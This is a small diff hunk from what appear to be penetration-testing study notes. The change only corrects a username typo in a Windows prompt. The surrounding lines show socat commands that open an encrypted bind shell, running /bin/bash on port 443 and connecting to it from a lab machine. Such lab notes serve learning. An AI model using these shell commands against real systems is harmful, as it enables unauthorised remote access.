@@ -61,7 +61,7 @@
 
     gothburz@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
 
-    PS C:\Users\gothburzt> socat.exe - OPENSSL:192.168.119.134:443,cert=bind_shell.pem,verify=0
+    PS C:\Users\gothburz> socat.exe - OPENSSL:192.168.119.134:443,cert=bind_shell.pem,verify=0
 
 ## Encrypted Reverse Shell
 
